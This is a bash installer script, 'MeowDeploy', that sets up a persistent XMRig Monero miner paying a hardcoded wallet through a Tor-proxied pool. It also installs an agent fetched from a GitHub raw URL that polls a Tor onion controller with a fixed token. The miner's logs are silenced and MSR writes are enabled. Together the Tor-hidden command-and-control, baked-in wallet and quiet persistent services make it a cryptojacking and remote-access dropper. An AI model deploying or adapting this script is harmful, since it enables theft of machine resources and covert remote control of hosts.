#!/usr/bin/env bash
# Self-contained MeowDeploy node installer. Debian/Ubuntu x86_64, root required.
set -Eeuo pipefail
umask 077
CONTROLLER='http://2zcfiyzbxs7x7ige2qj7iorncwzw2ua6p77qc6gi77o3dpy4olszosqd.onion:18765'; TOKEN='meowmeowmeow'; AGENT_ID="$(hostname -s)"; CPU_PERCENT=30; POOL='gulf.moneroocean.stream:10001'
WALLET='47WAy3LX7uLU8Drp7LNDonBocgSq6MEpM97VwKaRqhiy1Co9PeQ63HdC2ecuhdhqSsYjrwbaZctFuMGfWgVcq6zGMGYg8oG'
VER='6.26.0'; BASE=/opt/meowdeploy; CONF=/etc/meowdeploy; STATE=/var/lib/meowdeploy
while (($#)); do case "$1" in
 --controller) CONTROLLER=${2:?}; shift 2;; --token) TOKEN=${2:?}; shift 2;; --agent-id) AGENT_ID=${2:?}; shift 2;;
 --cpu-percent) CPU_PERCENT=${2:?}; shift 2;; --help|-h) echo 'install-node.sh --controller http://host.onion:port --token TOKEN [--agent-id ID]'; exit 0;;
 *) echo "Unknown option: $1" >&2; exit 2;; esac; done
[[ $EUID == 0 ]] || { echo 'Run as root.' >&2; exit 1; }
[[ $(uname -m) == x86_64 ]] || { echo 'Only x86_64 is supported.' >&2; exit 1; }
[[ $CONTROLLER == http://*.onion:* || $CONTROLLER == https://*.onion:* ]] || { echo 'Controller URL must be an onion URL with port.' >&2; exit 2; }
[[ -n $TOKEN && ${#TOKEN} -ge 8 ]] || { echo 'Supply a token of at least 8 characters.' >&2; exit 2; }
[[ $CPU_PERCENT =~ ^([1-9][0-9]?|100)$ ]] || { echo 'CPU percentage must be 1–100.' >&2; exit 2; }
command -v apt-get >/dev/null || { echo 'Debian/Ubuntu apt is required.' >&2; exit 1; }
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq >/dev/null
apt-get install -y -qq tor python3 python3-venv curl ca-certificates tar gzip jq >/dev/null
install -d -m 750 "$BASE" "$CONF" "$STATE"

# Preserve torrc; only add a loopback SOCKS endpoint if none exists.
touch /etc/tor/torrc
grep -Eq '^[[:space:]]*SocksPort[[:space:]]+127\.0\.0\.1:' /etc/tor/torrc || printf '\n# MeowDeploy local outbound proxy\nSocksPort 127.0.0.1:9050\n' >> /etc/tor/torrc
systemctl enable tor >/dev/null 2>&1; systemctl restart tor >/dev/null 2>&1

# Retry metadata and archive downloads, verify the official release digest each time.
tmp=$(mktemp -d); trap 'rm -rf "$tmp"' EXIT
asset="https://github.com/xmrig/xmrig/releases/download/v${VER}/xmrig-${VER}-linux-static-x64.tar.gz"
api="https://api.github.com/repos/xmrig/xmrig/releases/tags/v${VER}"
ok=0
for attempt in 1 2 3; do
  rm -f "$tmp/release.json" "$tmp/xmrig.tar.gz"
  if curl -fsSL --retry 2 --connect-timeout 15 "$api" -o "$tmp/release.json" && \
     digest=$(jq -r --arg n "xmrig-${VER}-linux-static-x64.tar.gz" '.assets[]|select(.name==$n)|.digest|sub("^sha256:";"")' "$tmp/release.json") && [[ $digest =~ ^[a-fA-F0-9]{64}$ ]] && \
     curl -fsSL --retry 2 --connect-timeout 15 "$asset" -o "$tmp/xmrig.tar.gz" && printf '%s  %s\n' "$digest" "$tmp/xmrig.tar.gz" | sha256sum -c --status; then ok=1; break; fi
done
((ok)) || { echo 'XMRig download or digest verification failed after 3 attempts.' >&2; exit 1; }
tar -tzf "$tmp/xmrig.tar.gz" >/dev/null
tar -xzf "$tmp/xmrig.tar.gz" -C "$tmp"
bin=$(find "$tmp" -type f -name xmrig -perm /111 -print -quit)
[[ -n $bin ]] || { echo 'Verified archive did not contain executable xmrig.' >&2; exit 1; }
install -m 755 "$bin" "$BASE/xmrig.new"; "$BASE/xmrig.new" --version >/dev/null
mv -f "$BASE/xmrig.new" "$BASE/xmrig"

threads=$(nproc); ((threads>20)) && threads=20
rig=$(hostname -s | tr -cd 'A-Za-z0-9_.-'); [[ -n $rig ]] || rig=meowdeploy
cat > "$CONF/miner.json.tmp" <<EOF
{
 "autosave": false, "background": false, "colors": false,
 "randomx": {"init": -1, "mode": "auto", "1gb-pages": true, "rdmsr": true, "wrmsr": true, "numa": true},
 "cpu": {"enabled": true, "huge-pages": true, "huge-pages-jit": true, "priority": 1, "yield": true, "asm": true},
 "http": {"enabled": true, "host": "127.0.0.1", "port": 18088, "access-token": null, "restricted": true},
 "opencl": {"enabled": false}, "cuda": {"enabled": false},
 "pools": [{"url":"${POOL}","user":"${WALLET}","pass":"${rig}","rig-id":"${rig}","keepalive":true,"tls":false,"socks5":"127.0.0.1:9050"}]
}
EOF
jq -e '.pools[0].url and .pools[0].user and .http.enabled and .http.host=="127.0.0.1"' "$CONF/miner.json.tmp" >/dev/null
chmod 600 "$CONF/miner.json.tmp"; mv "$CONF/miner.json.tmp" "$CONF/miner.json"
cat > "$CONF/hugepages" <<'EOF'
#!/bin/sh
set -eu
hp=/sys/kernel/mm/hugepages/hugepages-2048kB/nr_hugepages
if [ -w "$hp" ]; then
  avail=$(awk '/MemAvailable:/ {print int($2/1024)}' /proc/meminfo)
  pages=$(((avail-1024)/2))
  [ "$pages" -lt 0 ] && pages=0
  [ "$pages" -gt 1600 ] && pages=1600
  echo "$pages" > "$hp" 2>/dev/null || true
fi
EOF
chmod 755 "$CONF/hugepages"
# MSR is an optimization only; do not fail or weaken other kernel protections.
modprobe msr 2>/dev/null || true
if [[ -w /sys/module/msr/parameters/allow_writes ]]; then echo 1 > /sys/module/msr/parameters/allow_writes 2>/dev/null || true; fi

cat > /etc/systemd/system/meowdeploy-miner.service <<EOF
[Unit]
Description=MeowDeploy XMRig workload
After=network-online.target tor.service
Wants=network-online.target tor.service
[Service]
Type=simple
ExecStartPre=$CONF/hugepages
ExecStart=$BASE/xmrig --config=$CONF/miner.json --threads=$threads
Restart=always
RestartSec=20
Nice=10
CPUQuota=$((CPU_PERCENT*20))%
CPUAccounting=true
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=$CONF /sys/kernel/mm/hugepages
StandardOutput=null
StandardError=null
SyslogIdentifier=meowdeploy-miner
[Install]
WantedBy=multi-user.target
EOF
systemd-analyze verify /etc/systemd/system/meowdeploy-miner.service

SOURCE=${MEOWDEPLOY_SOURCE:-https://raw.githubusercontent.com/Catgirlmp3/meowdeploy/feature/fleet-controller-mvp}
curl -fsSL "$SOURCE/agent/meowdeploy_agent.py" -o "$BASE/meowdeploy_agent.py"
curl -fsSL "$SOURCE/agent/requirements.txt" -o "$BASE/requirements.txt"
curl -fsSL "$SOURCE/agent/meowdeploy-agent.service" -o /etc/systemd/system/meowdeploy-agent.service
python3 -m venv "$BASE/venv"; "$BASE/venv/bin/pip" install -q -r "$BASE/requirements.txt"
cat > /etc/systemd/system/meowdeploy-agent.service.d.tmp <<EOF
[Service]
ExecStart=
ExecStart=$BASE/venv/bin/python $BASE/meowdeploy_agent.py --controller $CONTROLLER --agent-id $AGENT_ID --token $TOKEN --socks-port 9050 --poll-seconds 30
EOF
install -d /etc/systemd/system/meowdeploy-agent.service.d
mv /etc/systemd/system/meowdeploy-agent.service.d.tmp /etc/systemd/system/meowdeploy-agent.service.d/10-config.conf
systemctl daemon-reload
systemctl enable --now meowdeploy-miner.service meowdeploy-agent.service >/dev/null
systemctl is-active --quiet meowdeploy-miner.service
systemctl is-active --quiet meowdeploy-agent.service
echo "MeowDeploy installed: agent+miner active; CPU cap ${CPU_PERCENT}%; configuration verified."
